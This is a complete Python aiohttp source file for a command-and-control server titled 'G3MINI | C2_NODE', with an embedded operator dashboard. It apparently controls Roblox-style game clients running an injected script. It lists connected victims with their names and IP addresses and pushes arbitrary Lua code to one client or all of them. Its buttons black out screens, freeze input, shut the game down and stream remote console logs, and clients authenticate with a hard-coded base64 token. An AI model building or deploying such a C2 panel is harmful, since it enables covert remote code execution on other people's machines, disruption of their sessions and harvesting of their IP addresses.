import os, asyncio, json
from aiohttp import web

# --- SERVER CONFIG ---
clients = {} 
logs = []
game_console_logs = {} 
INTERNAL_SCRIPT_ID = "cnVzdHlSYXR0MWZ5ODI2NzUkODM=" 

HTML_PAGE = """
<!DOCTYPE html>
<html>
<head>
    <title>G3MINI | C2_NODE</title>
    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700&family=Inter:wght@300;500&display=swap" rel="stylesheet">
    <style>
        :root { --bg: #0a0b10; --glass: rgba(255, 255, 255, 0.03); --border: rgba(255, 255, 255, 0.1); --neon-green: #00ff88; --neon-red: #ff3e3e; --neon-blue: #00d4ff; --neon-orange: #ff9d00; }
        body { font-family: 'Inter', sans-serif; background: var(--bg); color: #e0e0e0; display: flex; height: 100vh; margin: 0; overflow: hidden; }
        #sidebar { width: 380px; background: rgba(0,0,0,0.4); backdrop-filter: blur(10px); padding: 20px; border-right: 1px solid var(--border); overflow-y: auto; }
        #main { flex: 1; padding: 30px; display: flex; flex-direction: column; gap: 20px; position: relative; }
        .stat-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 15px; }
        .stat-card { background: var(--glass); border: 1px solid var(--border); padding: 15px; border-radius: 12px; text-align: center; }
        .stat-card b { font-family: 'Orbitron'; font-size: 16px; color: var(--neon-green); }
        .control-panel { display: grid; grid-template-columns: 1fr 1.5fr; gap: 20px; flex: 1; }
        .action-box { background: var(--glass); border: 1px solid var(--border); padding: 20px; border-radius: 15px; display: flex; flex-direction: column; gap: 10px; }
        .btn { padding: 12px; border-radius: 8px; border: none; cursor: pointer; font-weight: 600; font-size: 11px; transition: 0.3s; text-transform: uppercase; border: 1px solid transparent; }
        .btn:hover { transform: translateY(-2px); filter: brightness(1.2); }
        .btn-active-red { background: var(--neon-red) !important; color: #000 !important; box-shadow: 0 0 15px var(--neon-red); }
        .btn-active-blue { background: var(--neon-blue) !important; color: #000 !important; box-shadow: 0 0 15px var(--neon-blue); }
        textarea { flex: 1; background: #000; color: var(--neon-green); border: 1px solid var(--border); padding: 15px; border-radius: 10px; font-family: 'Consolas', monospace; resize: none; outline: none; }
        #logs { height: 80px; background: rgba(0,0,0,0.5); border-radius: 10px; padding: 12px; font-size: 11px; color: #aaa; overflow-y: auto; border: 1px solid var(--border); }
        .client-item { padding: 12px; border-radius: 8px; margin-bottom: 10px; cursor: pointer; background: var(--glass); border: 1px solid transparent; font-size: 11px; }
        .client-item.selected { border-color: var(--neon-green); background: rgba(0, 255, 136, 0.05); }
        .client-item b { color: var(--neon-blue); font-size: 13px; }
        .ip-text { color: var(--neon-orange); font-family: 'Consolas', monospace; }
        #console-window { display: none; position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); width: 700px; height: 450px; background: #000; border: 1px solid var(--neon-orange); z-index: 1000; flex-direction: column; border-radius: 15px; }
        #console-header { background: var(--neon-orange); color: #000; padding: 10px; font-weight: bold; display: flex; justify-content: space-between; }
        #console-content { flex: 1; padding: 15px; overflow-y: auto; color: var(--neon-orange); font-family: 'Consolas', monospace; font-size: 11px; white-space: pre-wrap; }
    </style>
</head>
<body>
    <div id="sidebar">
        <h3 style="font-family:'Orbitron'; font-size:14px; color:var(--neon-blue)">📡 NETWORK NODES</h3>
        <div id="client-list"><div class="client-item selected" onclick="selectClient('all')"><b>GLOBAL_BROADCAST</b></div></div>
    </div>
    <div id="main">
        <div class="stat-grid">
            <div class="stat-card"><span>Active</span><b id="node-count">0</b></div>
            <div class="stat-card"><span>Target</span><b id="current-target" style="color:var(--neon-blue)">ALL</b></div>
            <div class="stat-card"><span>Uptime</span><b style="color:var(--neon-green)">STABLE</b></div>
        </div>
        <div class="control-panel">
            <div class="action-box">
                <button id="btn-blackout" class="btn" style="background:#222; color:var(--neon-red); border-color:var(--neon-red)" onclick="toggleAction('blackout')">🌑 BLACKOUT</button>
                <button id="btn-freeze" class="btn" style="background:#222; color:var(--neon-blue); border-color:var(--neon-blue)" onclick="toggleAction('freeze')">🔒 FREEZE INPUT</button>
                <button class="btn" style="background:var(--neon-orange); color:#000" onclick="toggleWindow('console-window')">📜 REMOTE F9</button>
                <button class="btn" style="background:#440000; color:#fff" onclick="quick('game:Shutdown()')">⚠️ SHUTDOWN</button>
            </div>
            <div class="action-box">
                <textarea id="code" placeholder="-- Input payload..."></textarea>
                <button class="btn" style="background:var(--neon-green); color:#000; font-family:'Orbitron'" onclick="send()">RUN_CODE</button>
            </div>
        </div>
        <div id="logs"></div>
    </div>
    <div id="console-window">
        <div id="console-header"><span>REMOTE_LOGS</span><span onclick="toggleWindow('console-window')" style="cursor:pointer;">[X]</span></div>
        <div id="console-content"></div>
    </div>
    <script>
        let selectedClient = "all";
        let states = { blackout: false, freeze: false };
        function toggleWindow(id) { const w = document.getElementById(id); w.style.display = (w.style.display==='flex')?'none':'flex'; }
        function selectClient(id) { selectedClient = id; updateUI(); }
        async function quick(c) { await fetch('/send', {method:'POST', body: JSON.stringify({code: c, target: selectedClient}), headers:{'Content-Type':'application/json'}}); }
        async function send() { await quick(document.getElementById('code').value); }
        async function toggleAction(type) {
            states[type] = !states[type];
            const btn = document.getElementById(type === 'blackout' ? 'btn-blackout' : 'btn-freeze');
            if(type === 'blackout') {
                btn.innerHTML = states.blackout ? "🌕 RESTORE" : "🌑 BLACKOUT";
                btn.className = states.blackout ? "btn btn-active-red" : "btn";
                await quick(`_G.SetBlackout(${states.blackout})`);
            } else {
                btn.innerHTML = states.freeze ? "🔓 UNFREEZE" : "🔒 FREEZE INPUT";
                btn.className = states.freeze ? "btn btn-active-blue" : "btn";
                await quick(`_G.BlockInput(${states.freeze})`);
            }
        }
        async function updateUI() {
            try {
                const res = await fetch('/status'); const data = await res.json();
                document.getElementById('node-count').innerText = data.clients.length;
                document.getElementById('logs').innerHTML = data.logs.slice().reverse().map(l => `<div>${l}</div>`).join('');
                let html = `<div class="client-item ${selectedClient === 'all' ? 'selected' : ''}" onclick="selectClient('all')"><b>GLOBAL_BROADCAST</b></div>`;
                data.clients.forEach(c => { 
                    html += `<div class="client-item ${selectedClient===c.id?'selected':''}" onclick="selectClient('${c.id}')">
                        <b>${c.name}</b> <br>
                        <span class="ip-text">${c.ip}</span> <br>
                        <small>${c.exec}</small>
                    </div>`; 
                });
                document.getElementById('client-list').innerHTML = html;
                if (selectedClient !== "all" && data.console[selectedClient]) {
                    document.getElementById('console-content').innerHTML = data.console[selectedClient].join('<br>');
                }
            } catch(e) {}
        }
        setInterval(updateUI, 2000);
    </script>
</body>
</html>
"""

async def handle_index(request): return web.Response(text=HTML_PAGE, content_type='text/html')

async def handle_status(request):
    c_list = [{"id": k, "name": v['info'].get('name'), "exec": v['info'].get('exec'), "ip": v['info'].get('ip')} for k, v in clients.items()]
    return web.json_response({"clients": c_list, "logs": logs[-10:], "console": game_console_logs})

async def handle_send(request):
    d = await request.json(); t, c = d.get('target'), d.get('code')
    if t == "all":
        for cl in clients.values(): await cl['ws'].send_str(c)
    elif t in clients: await clients[t]['ws'].send_str(c)
    return web.Response(text="OK")

async def websocket_handler(request):
    ws = web.WebSocketResponse(); await ws.prepare(request); cid = str(id(ws))
    try:
        async for msg in ws:
            if msg.type == web.WSMsgType.TEXT:
                d = json.loads(msg.data)
                if d.get("type") == "init":
                    if d.get("script_id") == INTERNAL_SCRIPT_ID:
                        clients[cid] = {"ws": ws, "info": d}
                        game_console_logs[cid] = ["> SYSTEM_OK"]
                        logs.append(f"🟢 {d['name']} logged from {d['ip']}")
                        break
                    else:
                        await ws.close(); return ws
    except:
        await ws.close(); return ws

    try:
        async for msg in ws:
            if msg.type == web.WSMsgType.TEXT:
                d = json.loads(msg.data)
                if d.get("type") == "f9_log":
                    game_console_logs[cid].append(f"[{d.get('time', '00:00')}] {d.get('msg')}")
                    if len(game_console_logs[cid]) > 50: game_console_logs[cid].pop(0)
    finally:
        if cid in clients: del clients[cid]
        if cid in game_console_logs: del game_console_logs[cid]
    return ws

app = web.Application()
app.add_routes([web.get('/', handle_index), web.get('/ws', websocket_handler), web.get('/status', handle_status), web.post('/send', handle_send)])
web.run_app(app, host='0.0.0.0', port=7860)
